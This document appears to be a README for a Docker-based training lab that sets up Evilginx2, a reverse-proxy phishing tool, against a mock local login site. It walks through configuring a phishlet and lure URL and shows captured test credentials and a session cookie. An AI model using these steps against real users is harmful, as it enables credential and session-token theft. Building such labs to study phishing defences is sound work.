# Evilginx LAB on Docker
![back](evil-dock.jpg)
## build & run the containers
	
	sudo docker-compose up --build -d --force-recreate --remove-orphans
	
Verify if they run:

	docker ps
	CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS          PORTS               NAMES
	636fa17740bf   evilginx_lab-main_apache-php   "apachectl -D FOREGR…"   41 minutes ago   Up 41 minutes   80/tcp, 443/tcp     targetsite.local
	2c595290c650   evilginx_lab-main_evilginx2    "/bin/bash -l"           41 minutes ago   Up 41 minutes   443/tcp, 8080/tcp   targetsile.local


## modify hosts in file in the host machine to mimic DNS
Add the following lines:

	172.18.0.20 	targetsite.local login.targetsite.local
	172.18.0.10	targetsile.local login.targetsile.local



## Start evilnginx
```bash 
sudo docker exec -it /targetsile.local /bin/bash 
root@bd1cc49349a5:/evilginx2# ./evilginx2 -developer

                                         
___________      __ __           __               
\_   _____/__  _|__|  |    ____ |__| ____ ___  ___
|    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
|        \\   /|  |  |__/ /_/  >  |   |  \>    < 
/_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
     \/              /_____/         \/      \/

        - --  Community Edition  -- -

by Kuba Gretzky (@mrgretzky)     version 3.3.0
                                         

[16:02:29] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)
[16:02:29] [inf] loading phishlets from: /evilginx2/phishlets
[16:02:29] [inf] loading configuration from: /root/.evilginx
[16:02:29] [inf] blacklist mode set to: unauth
[16:02:29] [inf] unauthorized request redirection URL set to: https://www.youtube.com/watch?v=dQw4w9WgXcQ
[16:02:29] [inf] https port set to: 443
[16:02:29] [inf] dns port set to: 53
[16:02:29] [inf] autocert is now enabled
[16:02:29] [inf] blacklist: loaded 0 ip addresses and 0 ip masks
[16:02:30] [war] server domain not set! type: config domain <domain>
[16:02:30] [war] server external ip not set! type: config ipv4 external <external_ipv4_address>

+-------------------+-----------+-------------+-----------+-------------+
|     phishlet      |  status   | visibility  | hostname  | unauth_url  |                                                                                                                                                                  
+-------------------+-----------+-------------+-----------+-------------+                                                                                                                                                                  
| example           | disabled  | visible     |           |             |                                                                                                                                                                  
| targetsite-local  | disabled  | visible     |           |             |                                                                                                                                                                  
+-------------------+-----------+-------------+-----------+-------------+                                                                                                                                                                  

:  


```
                                        
## Config Evilngnix container

	: config domain evilginx3.local
	: config ipv4 172.18.0.10
	: phishlets hostname targetsite-local evilginx3.local
	: phishlets get-hosts targetsite-local 

		172.18.0.10 login.evilginx3.local
		172.18.0.10 evilginx3.local
	: phishlets enable  targetsite-local 
	: lures create targetsite-local 
	: lures
	: lures get-url 0
		
		https://login.evilginx3.local/eiyTwTXQ

## Captured the session token
```bash 

: 2024/12/04 16:14:15 [001] WARN: Cannot handshake client login.targetsite.local remote error: tls: unknown certificate authority
[16:14:23] [imp] [0] [targetsite-local] new visitor has arrived: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 (10.0.2.15)
[16:14:23] [inf] [0] [targetsite-local] landing URL: https://login.evilginx3.local/eiyTwTXQ
[16:15:04] [+++] [0] Username: [adasdas]
[16:15:04] [+++] [0] Password: [dsdsdsd]
[16:15:45] [+++] [0] Username: [admin]
[16:15:45] [+++] [0] Password: [Pwd Sicur@ 123]
[16:15:45] [+++] [0] detected authorization URL - tokens intercepted: /admin.php
: sessions 

+-----+-------------------+-----------+-----------------+-----------+------------+-------------------+
| id  |     phishlet      | username  |    password     |  tokens   | remote ip  |       time        |                                                                                                                                      
+-----+-------------------+-----------+-----------------+-----------+------------+-------------------+                                                                                                                                      
| 1   | targetsite-local  | admin     | Pwd Sicur@ 123  | captured  | 10.0.2.15  | 2024-12-04 16:15  |                                                                                                                                      
+-----+-------------------+-----------+-----------------+-----------+------------+-------------------+          

: sessions 1

 id           : 1
 phishlet     : targetsite-local
 username     : admin
 password     : Pwd Sicur@ 123
 tokens       : captured
 landing url  : https://login.evilginx3.local/eiyTwTXQ
 user-agent   : Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 remote ip    : 10.0.2.15
 create time  : 2024-12-04 16:14
 update time  : 2024-12-04 16:15

[ cookies ]
[{"path":"/","domain":"login.targetsite.local","expirationDate":1764865104,"value":"sibi2d083ecfn4shbco7i1ro5d--very-insecure-fixed-VALUE--DO-NOT-USE-IT-NEVER-IN-REAL-APPLICATION","name":"session_token","httpOnly":true,"hostOnly":true}]

```
## useful Docker commands

### stop and remove all the containers

	sudo docker stop $(docker ps -q) && sudo docker rm $(docker ps -a -q) && sudo docker image prune -a
	
### access a container

	sudo docker exec -it <container name> /bin/bash

### check mounted volumes

	sudo docker inspect <container name> | grep Mounts -A 10
	

## see logs

	sudo docker logs <container name>
	
### show containers IP

	sudo docker ps -q | xargs -n 1 docker inspect -f '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'
	
	/targetsite.local - 172.18.0.20
	/targetsile.local - 172.18.0.10

